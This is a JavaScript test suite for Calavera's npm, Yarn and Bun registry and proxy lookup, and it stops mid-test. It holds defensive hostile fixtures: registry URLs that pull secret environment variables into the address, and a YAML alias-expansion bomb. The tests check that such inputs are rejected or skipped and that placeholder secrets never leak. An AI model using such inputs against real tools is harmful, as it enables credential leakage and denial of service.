import assert from "node:assert/strict";
import { access, mkdir, writeFile } from "node:fs/promises";
import { join } from "node:path";
import test, { afterEach } from "node:test";
import { inspect } from "node:util";

import { detectLauncher } from "../src/launcher-config.js";
import { loadNpmRegistryOptions } from "../src/npm-config.js";
import { removeTemporaryDirectories, temporaryDirectory } from "./temporary-directory.mjs";

afterEach(removeTemporaryDirectories);

const SCOPE = "@schalkneethling";
const SECRET = "SECRETVALUE0123456789";
const YARN = "yarn/4.9.1 npm/? node/v24.3.0 darwin arm64";
const BUN = "bun/1.3.9 npm/? node/v24.3.0 darwin arm64";

/**
 * A home folder, a workspace folder, and a project inside it, all in a temporary directory, with an
 * environment that cannot reach the developer's own configuration files. `files` maps a path
 * relative to the temporary directory to its content.
 * @param {{ files?: Record<string, string>, env?: Record<string, string>, userAgent?: string }} setup
 */
async function fixture({ files = {}, env = {}, userAgent }) {
  const directory = await temporaryDirectory("calavera-launcher-config-");
  const home = join(directory, "home");
  const cwd = join(directory, "workspace", "project");
  await mkdir(home, { recursive: true });
  await mkdir(cwd, { recursive: true });
  for (const [path, content] of Object.entries(files)) {
    await mkdir(join(directory, path, ".."), { recursive: true });
    await writeFile(join(directory, path), content);
  }
  return {
    cwd,
    scope: SCOPE,
    // The home folder stands in for the operating system account's, so its files are the user's own.
    accountHome: home,
    env: {
      HOME: home,
      ...(userAgent ? { npm_config_user_agent: userAgent } : {}),
      ...env,
    },
  };
}

test("under Yarn 2 or later, the project .yarnrc.yml registry is used and the .npmrc registry is not", async () => {
  const context = await fixture({
    userAgent: YARN,
    files: {
      "home/.npmrc": "registry=https://npm-mirror.example.com/\n",
      "workspace/project/.yarnrc.yml": 'npmRegistryServer: "https://yarn-mirror.example.com"\n',
    },
  });
  const { options, registry } = await loadNpmRegistryOptions(context);
  assert.equal(options.registry, "https://yarn-mirror.example.com");
  assert.deepEqual(registry, {
    origin: "https://yarn-mirror.example.com",
    source: "project .yarnrc.yml",
    setting: "npmRegistryServer",
  });
});

test("under Yarn with no registry setting, the Yarn default registry is used", async () => {
  const context = await fixture({
    userAgent: YARN,
    files: { "home/.npmrc": "registry=https://npm-mirror.example.com/\n" },
  });
  const { options, registry } = await loadNpmRegistryOptions(context);
  assert.equal(options.registry, "https://registry.yarnpkg.com");
  assert.deepEqual(registry, {
    origin: "https://registry.yarnpkg.com",
    source: "default",
    setting: null,
  });
});

test("under Yarn, npmScopes names the scope without @ and falls back to npmRegistryServer", async () => {
  const scoped = await fixture({
    userAgent: YARN,
    files: {
      "workspace/project/.yarnrc.yml":
        "npmRegistryServer: https://yarn-mirror.example.com\nnpmScopes:\n  schalkneethling:\n    npmRegistryServer: https://scoped.example.com\n",
    },
  });
  const scopedResult = await loadNpmRegistryOptions(scoped);
  assert.equal(scopedResult.options[`${SCOPE}:registry`], "https://scoped.example.com");
  assert.equal(scopedResult.registry.origin, "https://scoped.example.com");

  const unscoped = await fixture({
    userAgent: YARN,
    files: {
      "workspace/project/.yarnrc.yml":
        "npmRegistryServer: https://yarn-mirror.example.com\nnpmScopes:\n  other:\n    npmRegistryServer: https://other.example.com\n",
    },
  });
  const unscopedResult = await loadNpmRegistryOptions(unscoped);
  assert.equal(unscopedResult.options[`${SCOPE}:registry`], undefined);
  assert.equal(unscopedResult.registry.origin, "https://yarn-mirror.example.com");
});

test("under Yarn, the nearest .yarnrc.yml wins over parent folders and the home folder", async () => {
  const context = await fixture({
    userAgent: YARN,
    files: {
      "home/.yarnrc.yml": "npmRegistryServer: https://home.example.com\n",
      "workspace/.yarnrc.yml": "npmRegistryServer: https://workspace.example.com\n",
      "workspace/project/.yarnrc.yml": "npmRegistryServer: https://project.example.com\n",
    },
  });
  assert.equal(
    (await loadNpmRegistryOptions(context)).options.registry,
    "https://project.example.com",
  );

  const parentOnly = await fixture({
    userAgent: YARN,
    files: {
      "home/.yarnrc.yml": "npmRegistryServer: https://home.example.com\n",
      "workspace/.yarnrc.yml": "npmRegistryServer: https://workspace.example.com\n",
    },
  });
  assert.equal(
    (await loadNpmRegistryOptions(parentOnly)).options.registry,
    "https://workspace.example.com",
  );

  const homeOnly = await fixture({
    userAgent: YARN,
    files: { "home/.yarnrc.yml": "npmRegistryServer: http://home.example.com\n" },
  });
  assert.deepEqual((await loadNpmRegistryOptions(homeOnly)).registry, {
    origin: "http://home.example.com",
    source: "user .yarnrc.yml",
    setting: "npmRegistryServer",
  });
});

test("under Yarn, YARN_NPM_REGISTRY_SERVER overrides the files, and YARN_RC_FILENAME renames them", async () => {
  const context = await fixture({
    userAgent: YARN,
    files: { "workspace/project/.yarnrc.yml": "npmRegistryServer: https://project.example.com\n" },
    env: { YARN_NPM_REGISTRY_SERVER: "https://env.example.com" },
  });
  assert.deepEqual((await loadNpmRegistryOptions(context)).registry, {
    origin: "https://env.example.com",
    source: "environment",
    setting: "YARN_NPM_REGISTRY_SERVER",
  });

  const renamed = await fixture({
    userAgent: YARN,
    files: {
      "workspace/project/.yarnrc.yml": "npmRegistryServer: https://default-name.example.com\n",
      "workspace/project/custom.yml": "npmRegistryServer: https://custom-name.example.com\n",
    },
    env: { YARN_RC_FILENAME: "custom.yml" },
  });
  assert.equal(
    (await loadNpmRegistryOptions(renamed)).options.registry,
    "https://custom-name.example.com",
  );
});

test("under Yarn, the user .yarnrc.yml expands variables in a proxy value", async () => {
  const user = await fixture({
    userAgent: YARN,
    files: { "home/.yarnrc.yml": "httpsProxy: ${PROXY_URL:-http://fallback-proxy.example.com}\n" },
  });
  assert.equal(
    (await loadNpmRegistryOptions(user)).options.proxy,
    "http://fallback-proxy.example.com",
  );
});

test("under Yarn, a registry value with a variable stops the command, from a user or a project file", async () => {
  /** @type {[string, RegExp][]} */
  const cases = [
    ["home/.yarnrc.yml", /npmRegistryServer in the user \.yarnrc\.yml contains a variable/],
    [
      "workspace/project/.yarnrc.yml",
      /npmRegistryServer in the project \.yarnrc\.yml contains a variable/,
    ],
  ];
  for (const [path, message] of cases) {
    const context = await fixture({
      userAgent: YARN,
      files: { [path]: "npmRegistryServer: https://registry.example.com/${REGISTRY_TOKEN}/\n" },
      env: { REGISTRY_TOKEN: SECRET },
    });
    await assert.rejects(loadNpmRegistryOptions(context), (error) => {
      assert.match(error.message, message);
      assert.doesNotMatch(
        inspect(error, { depth: 10 }),
        new RegExp(`${SECRET}|registry\\.example`),
      );
      return true;
    });
  }
});

test("under Yarn, an unset variable in a user .yarnrc.yml proxy drops the setting and names the variable", async () => {
  const context = await fixture({
    userAgent: YARN,
    files: { "home/.yarnrc.yml": "httpsProxy: http://${CALAVERA_UNSET_HOST}\n" },
  });
  const { options, unsetVariables, diagnostics } = await loadNpmRegistryOptions(context);
  assert.equal(options.proxy, undefined);
  assert.deepEqual(unsetVariables, ["CALAVERA_UNSET_HOST"]);
  assert.match(diagnostics.join("\n"), /httpsProxy.*user \.yarnrc\.yml.*CALAVERA_UNSET_HOST/);
});

test("under Yarn, httpsProxy is used for an https registry and the .npmrc proxy is not", async () => {
  const context = await fixture({
    userAgent: YARN,
    files: {
      "home/.npmrc": "https-proxy=http://npm-proxy.example.com/\nnoproxy=a.example.com\n",
      "home/.yarnrc.yml": `httpProxy: http://plain-proxy.example.com\nhttpsProxy: http://user:${SECRET}@secure-proxy.example.com\n`,
    },
  });
  const { options, diagnostics } = await loadNpmRegistryOptions(context);
  assert.equal(options.proxy, `http://user:${SECRET}@secure-proxy.example.com`);
  assert.equal(options.httpsProxy, undefined);
  assert.equal(options.noProxy, undefined);
  assert.doesNotMatch(inspect(diagnostics), new RegExp(SECRET));
});

test("under Yarn, httpProxy is used for an http registry", async () => {
  const context = await fixture({
    userAgent: YARN,
    files: {
      "home/.yarnrc.yml":
        "npmRegistryServer: http://registry.example.com\nhttpProxy: http://plain-proxy.example.com\nhttpsProxy: http://secure-proxy.example.com\n",
    },
  });
  const { options } = await loadNpmRegistryOptions(context);
  assert.equal(options.proxy, "http://plain-proxy.example.com");
});

test("under Yarn, no .npmrc file and no npm_config_* variable is read", async () => {
  const context = await fixture({
    userAgent: YARN,
    files: {
      "workspace/project/.npmrc": "registry=https://project-npm.example.com/\n",
    },
    env: {
      npm_config_registry: "https://env-npm.example.com/",
      npm_config_https_proxy: "http://env-proxy.example.com/",
      "npm_config_//registry.yarnpkg.com/:_authToken": SECRET,
    },
  });
  // A folder where the user .npmrc would be: reading it would add a warning.
  await mkdir(join(context.env.HOME, ".npmrc"));
  const { options, warnings, diagnostics } = await loadNpmRegistryOptions(context);
  assert.deepEqual(options, { registry: "https://registry.yarnpkg.com" });
  assert.deepEqual([warnings, diagnostics], [[], []]);
});

test("under Yarn, a project .yarnrc.yml cannot choose an http registry", async () => {
  const context = await fixture({
    userAgent: YARN,
    files: { "workspace/project/.yarnrc.yml": "npmRegistryServer: http://registry.example.com\n" },
  });
  await assert.rejects(
    loadNpmRegistryOptions(context),
    /npmRegistryServer.*project \.yarnrc\.yml.*https/,
  );
});

test("an unparseable .yarnrc.yml is skipped with a warning that names the path and position, not the content", async () => {
  const context = await fixture({
    userAgent: YARN,
    files: { "workspace/project/.yarnrc.yml": `npmAuthToken: ${SECRET}\n  bad: [\n` },
  });
  const { options, warnings } = await loadNpmRegistryOptions(context);
  assert.equal(options.registry, "https://registry.yarnpkg.com");
  assert.equal(warnings.length, 1);
  assert.match(warnings[0], /\.yarnrc\.yml.*line \d+, column \d+/);
  assert.doesNotMatch(inspect(warnings), new RegExp(SECRET));
});

test("Yarn 1 reads .npmrc, so its user agent keeps the npm settings", async () => {
  const context = await fixture({
    userAgent: "yarn/1.22.22 npm/? node/v24.3.0 darwin arm64",
    files: {
      "home/.npmrc": "registry=https://npm-mirror.example.com/\n",
      "workspace/project/.yarnrc.yml": "npmRegistryServer: https://yarn-mirror.example.com\n",
    },
  });
  assert.equal(
    (await loadNpmRegistryOptions(context)).options.registry,
    "https://npm-mirror.example.com/",
  );
});

test("without a launcher user agent, Yarn and Bun files are not read", async () => {
  const context = await fixture({
    files: {
      "workspace/project/.yarnrc.yml": "npmRegistryServer: https://yarn-mirror.example.com\n",
      "workspace/project/bunfig.toml": '[install]\nregistry = "https://bun-mirror.example.com/"\n',
    },
  });
  const { registry } = await loadNpmRegistryOptions(context);
  assert.deepEqual(registry, {
    origin: "https://registry.npmjs.org",
    source: "default",
    setting: null,
  });
});

test("under Bun, the project bunfig.toml registry overrides the .npmrc files", async () => {
  const context = await fixture({
    userAgent: BUN,
    files: {
      "home/.npmrc": "registry=https://npm-mirror.example.com/\n",
      "workspace/project/bunfig.toml": '[install]\nregistry = "https://bun-mirror.example.com/"\n',
    },
  });
  const { options, registry } = await loadNpmRegistryOptions(context);
  assert.equal(options.registry, "https://bun-mirror.example.com/");
  assert.deepEqual(registry, {
    origin: "https://bun-mirror.example.com",
    source: "project bunfig.toml",
    setting: "install.registry",
  });
});

test("under Bun, the .npmrc registry applies when no bunfig.toml sets one", async () => {
  const context = await fixture({
    userAgent: BUN,
    files: { "workspace/project/.npmrc": "registry=https://npm-mirror.example.com/\n" },
  });
  assert.equal(
    (await loadNpmRegistryOptions(context)).options.registry,
    "https://npm-mirror.example.com/",
  );
});

test("under Bun, the project bunfig.toml overrides the global one, and XDG_CONFIG_HOME moves the global one", async () => {
  const context = await fixture({
    userAgent: BUN,
    files: {
      "home/.bunfig.toml": '[install]\nregistry = "https://global.example.com/"\n',
      "workspace/project/bunfig.toml": '[install]\nregistry = "https://project.example.com/"\n',
    },
  });
  assert.equal(
    (await loadNpmRegistryOptions(context)).options.registry,
    "https://project.example.com/",
  );

  const globalOnly = await fixture({
    userAgent: BUN,
    files: {
      "home/.bunfig.toml": '[install]\nregistry = "https://home.example.com/"\n',
      "xdg/.bunfig.toml": '[install]\nregistry = "https://xdg.example.com/"\n',
    },
  });
  globalOnly.env.XDG_CONFIG_HOME = join(globalOnly.env.HOME, "..", "xdg");
  assert.deepEqual((await loadNpmRegistryOptions(globalOnly)).registry, {
    origin: "https://xdg.example.com",
    source: "user bunfig.toml",
    setting: "install.registry",
  });
});

test("under Bun, BUN_CONFIG_REGISTRY and NPM_CONFIG_REGISTRY override bunfig.toml", async () => {
  const files = {
    "workspace/project/bunfig.toml": '[install]\nregistry = "https://project.example.com/"\n',
  };
  const npmVariable = await fixture({
    userAgent: BUN,
    files,
    env: { NPM_CONFIG_REGISTRY: "https://npm-env.example.com/" },
  });
  assert.equal(
    (await loadNpmRegistryOptions(npmVariable)).options.registry,
    "https://npm-env.example.com/",
  );

  const bunVariable = await fixture({
    userAgent: BUN,
    files,
    env: {
      NPM_CONFIG_REGISTRY: "https://npm-env.example.com/",
      BUN_CONFIG_REGISTRY: "https://bun-env.example.com/",
    },
  });
  assert.deepEqual((await loadNpmRegistryOptions(bunVariable)).registry, {
    origin: "https://bun-env.example.com",
    source: "environment",
    setting: "BUN_CONFIG_REGISTRY",
  });
});

test("under Bun, a scope registry is read with or without @, from a string or a table", async () => {
  const withAt = await fixture({
    userAgent: BUN,
    files: {
      "workspace/project/bunfig.toml":
        '[install.scopes]\n"@schalkneethling" = "https://scoped.example.com/"\n',
    },
  });
  assert.equal(
    (await loadNpmRegistryOptions(withAt)).options[`${SCOPE}:registry`],
    "https://scoped.example.com/",
  );

  const bare = await fixture({
    userAgent: BUN,
    files: {
      "workspace/project/bunfig.toml":
        '[install.scopes]\nschalkneethling = { url = "https://bare.example.com/", token = "$npm_token" }\n',
    },
  });
  const bareResult = await loadNpmRegistryOptions(bare);
  assert.equal(bareResult.options[`${SCOPE}:registry`], "https://bare.example.com/");
  assert.equal(bareResult.registry.origin, "https://bare.example.com");
});

test("under Bun, credentials in a bunfig.toml registry are left out of the URL and never printed", async () => {
  const context = await fixture({
    userAgent: BUN,
    files: {
      "workspace/project/bunfig.toml": `[install]\nregistry = "https://user:${SECRET}@registry.example.com/"\n[install.scopes]\nschalkneethling = { url = "https://scoped.example.com/", token = "${SECRET}" }\n`,
    },
  });
  const { options, warnings, diagnostics } = await loadNpmRegistryOptions(context);
  assert.equal(options.registry, "https://registry.example.com/");
  assert.equal(options[`${SCOPE}:registry`], "https://scoped.example.com/");
  assert.deepEqual(warnings, [
    "Used install.registry from the project bunfig.toml without the username and password in its URL: Calavera sends no credentials to any registry.",
  ]);
  assert.doesNotMatch(inspect([options, warnings, diagnostics]), new RegExp(SECRET));
});

test("under Bun, the .npmrc proxy settings are not used, because Bun does not read them", async () => {
  const context = await fixture({
    userAgent: BUN,
    files: { "home/.npmrc": "https-proxy=http://npm-proxy.example.com/\n" },
  });
  assert.equal((await loadNpmRegistryOptions(context)).options.httpsProxy, undefined);
});

test("an unparseable bunfig.toml is skipped with a warning that names the path and position, not the content", async () => {
  const context = await fixture({
    userAgent: BUN,
    files: { "workspace/project/bunfig.toml": `[install]\nregistry = "${SECRET}\n` },
  });
  const { warnings } = await loadNpmRegistryOptions(context);
  assert.equal(warnings.length, 1);
  assert.match(warnings[0], /bunfig\.toml.*line \d+, column \d+/);
  assert.doesNotMatch(inspect(warnings), new RegExp(SECRET));
});

test("under Bun, a project bunfig.toml cannot choose an http registry", async () => {
  const context = await fixture({
    userAgent: BUN,
    files: {
      "workspace/project/bunfig.toml": '[install]\nregistry = "http://registry.example.com/"\n',
    },
  });
  await assert.rejects(
    loadNpmRegistryOptions(context),
    /install\.registry.*project bunfig\.toml.*https/,
  );
});

test("under Bun, $XDG_CONFIG_HOME/.npmrc is the user .npmrc when it exists", async () => {
  const context = await fixture({
    userAgent: BUN,
    files: {
      "home/.npmrc": "registry=https://home.example.com/\n",
      "xdg/.npmrc": "registry=https://xdg.example.com/\n",
    },
  });
  const xdg = join(context.env.HOME, "..", "xdg");
  assert.equal(
    (await loadNpmRegistryOptions({ ...context, env: { ...context.env, XDG_CONFIG_HOME: xdg } }))
      .options.registry,
    "https://xdg.example.com/",
  );
  // Without the file, the home .npmrc applies; npm itself never reads the XDG file.
  const missing = join(context.env.HOME, "..", "no-xdg");
  assert.equal(
    (
      await loadNpmRegistryOptions({
        ...context,
        env: { ...context.env, XDG_CONFIG_HOME: missing },
      })
    ).options.registry,
    "https://home.example.com/",
  );
  const { npm_config_user_agent: _, ...npmEnv } = context.env;
  assert.equal(
    (await loadNpmRegistryOptions({ ...context, env: { ...npmEnv, XDG_CONFIG_HOME: xdg } })).options
      .registry,
    "https://home.example.com/",
  );
});

test("the launcher is read from the start of npm_config_user_agent", () => {
  /** @type {[string | undefined, string][]} */
  const cases = [
    [undefined, "npm"],
    ["npm/11.20.0 node/v24.3.0 darwin arm64 workspaces/false", "npm"],
    ["pnpm/11.28.10 npm/? node/v24.3.0 darwin arm64", "npm"],
    ["yarn/1.22.22 npm/? node/v24.3.0 darwin arm64", "npm"],
    ["yarn/2.4.3 npm/? node/v24.3.0 darwin arm64", "yarn"],
    ["yarn/10.0.0 npm/? node/v24.3.0 darwin arm64", "yarn"],
    ["bun/1.3.9 npm/? node/v24.3.0 darwin arm64", "bun"],
    ["npm/11.20.0 bun/1.3.9", "npm"],
    ["npm/11.20.0 yarn/4.9.1", "npm"],
  ];
  for (const [agent, launcher] of cases) {
    assert.equal(
      detectLauncher(agent === undefined ? {} : { npm_config_user_agent: agent }),
      launcher,
      String(agent),
    );
  }
});

test("under Yarn, YARN_HTTPS_PROXY and YARN_HTTP_PROXY override the files", async () => {
  const https = await fixture({
    userAgent: YARN,
    files: { "home/.yarnrc.yml": "httpsProxy: http://file-proxy.example.com\n" },
    env: { yarn_https_proxy: "http://env-proxy.example.com" },
  });
  assert.equal((await loadNpmRegistryOptions(https)).options.proxy, "http://env-proxy.example.com");

  const http = await fixture({
    userAgent: YARN,
    files: { "home/.yarnrc.yml": "npmRegistryServer: http://registry.example.com\n" },
    env: { YARN_HTTP_PROXY: "http://env-proxy.example.com" },
  });
  assert.equal((await loadNpmRegistryOptions(http)).options.proxy, "http://env-proxy.example.com");
});

test("under Yarn, the fallback forms follow Yarn: :- also replaces an empty value, - only an unset one", async () => {
  const context = await fixture({
    userAgent: YARN,
    files: {
      "home/.yarnrc.yml":
        "httpProxy: http://${EMPTY_HOST:-colon.example.com}\nhttpsProxy: http://proxy${EMPTY_HOST-.fallback}.example.com\n",
    },
    env: { EMPTY_HOST: "" },
  });
  assert.equal((await loadNpmRegistryOptions(context)).options.proxy, "http://proxy.example.com");
  // httpProxy applies to an http registry.
  const env = { ...context.env, YARN_NPM_REGISTRY_SERVER: "http://registry.example.com" };
  assert.equal(
    (await loadNpmRegistryOptions({ ...context, env })).options.proxy,
    "http://colon.example.com",
  );

  const unset = await fixture({
    userAgent: YARN,
    files: {
      "home/.yarnrc.yml": "httpsProxy: http://proxy${CALAVERA_UNSET-.fallback}.example.com\n",
    },
  });
  assert.equal(
    (await loadNpmRegistryOptions(unset)).options.proxy,
    "http://proxy.fallback.example.com",
  );
});

test("under Yarn, a nested fallback is not understood, so the setting is ignored", async () => {
  const context = await fixture({
    userAgent: YARN,
    files: { "home/.yarnrc.yml": "httpsProxy: http://${A_HOST:-${B_HOST}}\n" },
    env: { B_HOST: "b.example.com" },
  });
  const { options, diagnostics } = await loadNpmRegistryOptions(context);
  assert.equal(options.proxy, undefined);
  assert.match(diagnostics.join("\n"), /httpsProxy.*unsupported/);
});

test("under Yarn, an empty .yarnrc.yml or an empty scope entry is not an error", async () => {
  const context = await fixture({
    userAgent: YARN,
    files: {
      "home/.yarnrc.yml": "",
      "workspace/.yarnrc.yml": "just a string\n",
      "workspace/project/.yarnrc.yml": "npmScopes:\n  schalkneethling:\n",
    },
  });
  const { options, warnings } = await loadNpmRegistryOptions(context);
  assert.equal(options.registry, "https://registry.yarnpkg.com");
  assert.deepEqual(warnings, []);
});

test("under Yarn, a project inside the home folder still trusts the home .yarnrc.yml", async () => {
  const context = await fixture({
    userAgent: YARN,
    files: { "home/.yarnrc.yml": "npmRegistryServer: http://registry.example.com\n" },
  });
  const cwd = join(context.env.HOME, "code", "project");
  await mkdir(cwd, { recursive: true });
  const { registry } = await loadNpmRegistryOptions({ ...context, cwd });
  assert.deepEqual(registry, {
    origin: "http://registry.example.com",
    source: "user .yarnrc.yml",
    setting: "npmRegistryServer",
  });
});

test("errors and warnings name the Yarn or Bun setting as the person wrote it", async () => {
  const scoped = await fixture({
    userAgent: YARN,
    files: {
      "home/.yarnrc.yml": "npmScopes:\n  schalkneethling:\n    npmRegistryServer: not-a-url\n",
    },
  });
  await assert.rejects(
    loadNpmRegistryOptions(scoped),
    /The Yarn setting npmScopes\.schalkneethling\.npmRegistryServer in the user \.yarnrc\.yml must be an http or https URL/,
  );

  const yarnVariable = await fixture({
    userAgent: YARN,
    env: { YARN_NPM_REGISTRY_SERVER: "not-a-url" },
  });
  await assert.rejects(
    loadNpmRegistryOptions(yarnVariable),
    /The Yarn setting YARN_NPM_REGISTRY_SERVER must be/,
  );

  const proxy = await fixture({
    userAgent: YARN,
    files: {
      "home/.yarnrc.yml": "httpProxy: ftp://a.example.com\nhttpsProxy: ftp://b.example.com\n",
    },
  });
  const { warnings } = await loadNpmRegistryOptions(proxy);
  assert.match(warnings[0], /Ignored httpProxy in the user \.yarnrc\.yml/);
  assert.match(warnings[1], /Ignored httpsProxy in the user \.yarnrc\.yml/);

  const bunScope = await fixture({
    userAgent: BUN,
    files: { "home/.bunfig.toml": '[install.scopes]\nschalkneethling = "not-a-url"\n' },
  });
  await assert.rejects(
    loadNpmRegistryOptions(bunScope),
    /The Bun setting install\.scopes\.schalkneethling in the user bunfig\.toml must be/,
  );
});

test("under Bun, credential fields of a registry table are not read, and a table without url is skipped", async () => {
  const context = await fixture({
    userAgent: BUN,
    files: {
      "home/.bunfig.toml": `[install]\nregistry = { url = "https://registry.example.com/", username = "me", password = "${SECRET}", token = "${SECRET}" }\n[install.scopes]\nschalkneethling = { token = "${SECRET}" }\n`,
    },
  });
  const { options, registry, diagnostics } = await loadNpmRegistryOptions(context);
  assert.deepEqual(options, { registry: "https://registry.example.com/" });
  assert.equal(registry.source, "user bunfig.toml");
  // Calavera does not look for credential keys, so it does not name them either (ADR-0021).
  assert.deepEqual(diagnostics, []);
});

test("under Yarn, only the registry and proxy options reach pacote", async () => {
  const context = await fixture({
    userAgent: YARN,
    files: {
      "home/.npmrc": "//registry.yarnpkg.com/:_authToken=token-value\nstrict-ssl=false\n",
      "home/.yarnrc.yml":
        "httpProxy: http://plain-proxy.example.com\nhttpsProxy: http://secure-proxy.example.com\nenableScripts: false\nnpmAuthToken: token-value\n",
    },
    env: {
      YARN_ENABLE_TELEMETRY: "0",
      YARN_NPM_AUTH_TOKEN: "token-value",
      OTHER_VARIABLE: "value",
    },
  });
  const { options } = await loadNpmRegistryOptions(context);
  assert.deepEqual(options, {
    registry: "https://registry.yarnpkg.com",
    proxy: "http://secure-proxy.example.com",
  });
});

test("an unscoped package ignores Yarn and Bun scope settings", async () => {
  const yarn = await fixture({
    userAgent: YARN,
    files: {
      "home/.yarnrc.yml":
        "npmScopes:\n  schalkneethling:\n    npmRegistryServer: https://scoped.example.com\n",
    },
  });
  const yarnResult = await loadNpmRegistryOptions({ ...yarn, scope: undefined });
  assert.equal(yarnResult.registry.origin, "https://registry.yarnpkg.com");

  const bun = await fixture({
    userAgent: BUN,
    files: {
      "home/.bunfig.toml": '[install.scopes]\nschalkneethling = "https://scoped.example.com/"\n',
    },
  });
  const bunResult = await loadNpmRegistryOptions({ ...bun, scope: undefined });
  assert.deepEqual(bunResult.registry, {
    origin: "https://registry.npmjs.org",
    source: "default",
    setting: null,
  });
});

test("under Bun, a username or password in a registry URL is removed with a warning, and no other note is added", async () => {
  const plain = await fixture({
    userAgent: BUN,
    files: {
      "home/.bunfig.toml": '[install]\nregistry = { url = "https://registry.example.com/" }\n',
    },
  });
  const plainResult = await loadNpmRegistryOptions(plain);
  assert.equal(plainResult.options.registry, "https://registry.example.com/");
  assert.deepEqual(plainResult.diagnostics, []);

  for (const url of [
    `https://user:${SECRET}@registry.example.com/`,
    `https://${SECRET}@registry.example.com/`,
    `https://:${SECRET}@registry.example.com/`,
  ]) {
    const context = await fixture({
      userAgent: BUN,
      files: { "workspace/project/bunfig.toml": `[install]\nregistry = { url = "${url}" }\n` },
    });
    const { options, warnings, diagnostics } = await loadNpmRegistryOptions(context);
    assert.equal(options.registry, "https://registry.example.com/");
    assert.deepEqual(warnings, [
      "Used install.registry from the project bunfig.toml without the username and password in its URL: Calavera sends no credentials to any registry.",
    ]);
    assert.doesNotMatch(inspect([options, warnings, diagnostics]), new RegExp(SECRET));
  }
});

test("under Bun, the user bunfig.toml and BUN_CONFIG_REGISTRY may choose an http registry", async () => {
  const user = await fixture({
    userAgent: BUN,
    files: { "home/.bunfig.toml": '[install]\nregistry = "http://registry.example.com/"\n' },
  });
  assert.equal((await loadNpmRegistryOptions(user)).registry.origin, "http://registry.example.com");

  const variable = await fixture({
    userAgent: BUN,
    env: { BUN_CONFIG_REGISTRY: "http://registry.example.com/" },
  });
  assert.equal(
    (await loadNpmRegistryOptions(variable)).registry.origin,
    "http://registry.example.com",
  );
});

test("parse warnings say which package manager's file was skipped", async () => {
  const yarn = await fixture({
    userAgent: YARN,
    files: { "workspace/project/.yarnrc.yml": "a: [\n" },
  });
  assert.match(
    (await loadNpmRegistryOptions(yarn)).warnings[0],
    /^Could not parse the Yarn configuration file /,
  );
  const bun = await fixture({
    userAgent: BUN,
    files: { "workspace/project/bunfig.toml": "[install\n" },
  });
  assert.match(
    (await loadNpmRegistryOptions(bun)).warnings[0],
    /^Could not parse the Bun configuration file /,
  );
});

test("an unreadable .yarnrc.yml or bunfig.toml is skipped with a warning that names the file kind and code", async () => {
  const yarn = await fixture({ userAgent: YARN });
  await mkdir(join(yarn.cwd, ".yarnrc.yml"));
  assert.match(
    (await loadNpmRegistryOptions(yarn)).warnings[0],
    /^Could not read the Yarn configuration file .*\.yarnrc\.yml \(EISDIR\)/,
  );
  const bun = await fixture({ userAgent: BUN });
  await mkdir(join(bun.cwd, "bunfig.toml"));
  assert.match(
    (await loadNpmRegistryOptions(bun)).warnings[0],
    /^Could not read the Bun configuration file .*bunfig\.toml \(EISDIR\)/,
  );
});

test("under Bun, a registry string without credentials and a scope table without url add no note", async () => {
  const context = await fixture({
    userAgent: BUN,
    files: {
      "home/.bunfig.toml": `[install]\nregistry = "https://registry.example.com/"\n[install.scopes]\nschalkneethling = { token = "value" }\n`,
    },
  });
  const { options, diagnostics } = await loadNpmRegistryOptions(context);
  assert.equal(options.registry, "https://registry.example.com/");
  assert.deepEqual(diagnostics, []);
});

test("under Bun, BUN_CONFIG_REGISTRY that does not start with http:// or https:// is skipped, as Bun skips it", async () => {
  const context = await fixture({
    userAgent: BUN,
    files: { "home/.bunfig.toml": '[install]\nregistry = "https://file.example.com/"\n' },
    env: { BUN_CONFIG_REGISTRY: "mirror.example.com" },
  });
  assert.equal(
    (await loadNpmRegistryOptions(context)).options.registry,
    "https://file.example.com/",
  );
});

test("under Bun, a $VAR registry stops the command, from the user or a project bunfig.toml", async () => {
  for (const [path, layer] of [
    ["home/.bunfig.toml", "user"],
    ["workspace/project/bunfig.toml", "project"],
  ]) {
    const context = await fixture({
      userAgent: BUN,
      files: { [path]: '[install]\nregistry = "$MY_REGISTRY"\n' },
      env: { MY_REGISTRY: `https://registry.example.com/${SECRET}/` },
    });
    await assert.rejects(loadNpmRegistryOptions(context), (error) => {
      assert.match(
        error.message,
        new RegExp(
          `^The Bun setting install\\.registry in the ${layer} bunfig\\.toml contains a variable reference\\.`,
        ),
      );
      assert.doesNotMatch(inspect(error, { depth: 10 }), new RegExp(SECRET));
      return true;
    });
  }
});

test("under Bun, NPM_CONFIG_REGISTRY wins over bunfig.toml although bun run sets npm_lifecycle_event", async () => {
  const context = await fixture({
    userAgent: BUN,
    files: {
      "workspace/project/.npmrc": "registry=https://a.example.com/\n",
      "home/.bunfig.toml": '[install]\nregistry = "https://b.example.com/"\n',
    },
    env: {
      NPM_CONFIG_REGISTRY: "https://a.example.com/",
      npm_command: "run-script",
      npm_lifecycle_event: "start",
    },
  });
  assert.deepEqual((await loadNpmRegistryOptions(context)).registry, {
    origin: "https://a.example.com",
    source: "environment",
    setting: "NPM_CONFIG_REGISTRY",
  });
});

test("a .yarnrc.yml with excessive aliases is skipped with a warning instead of stopping the lookup", async () => {
  const lines = ['a: &a ["x","x","x","x","x","x","x","x","x"]'];
  const names = "abcdefghi";
  for (let index = 1; index < names.length; index += 1) {
    lines.push(
      `${names[index]}: &${names[index]} [${Array(9)
        .fill(`*${names[index - 1]}`)
        .join(",")}]`,
    );
  }
  const context = await fixture({
    userAgent: YARN,
    files: { "workspace/project/.yarnrc.yml": `${lines.join("\n")}\n` },
  });
  const { options, warnings } = await loadNpmRegistryOptions(context);
  assert.equal(options.registry, "https://registry.yarnpkg.com");
  assert.match(
    warnings[0],
    /^Could not parse the Yarn configuration file .*\.yarnrc\.yml, so Calavera skipped it\.$/,
  );
});

test("under Yarn, an escaped \\${NAME} in a proxy is not expanded, so the setting is ignored", async () => {
  const context = await fixture({
    userAgent: YARN,
    files: { "home/.yarnrc.yml": "httpsProxy: http://\\${PROXY_HOST}\n" },
    env: { PROXY_HOST: "expanded.example.com" },
  });
  const { options } = await loadNpmRegistryOptions(context);
  assert.equal(options.proxy, undefined);
});

test("under Yarn, a proxy from a project .yarnrc.yml is ignored", async () => {
  const context = await fixture({
    userAgent: YARN,
    files: { "workspace/project/.yarnrc.yml": "httpsProxy: http://proxy.example.com\n" },
  });
  const { options, warnings } = await loadNpmRegistryOptions(context);
  assert.equal(options.proxy, undefined);
  assert.match(warnings[0], /^Ignored httpsProxy in the project \.yarnrc\.yml/);
});

test("BUN_CONFIG_REGISTRY must start with the protocol, loses its credentials, and its errors name the variable", async () => {
  const embedded = await fixture({
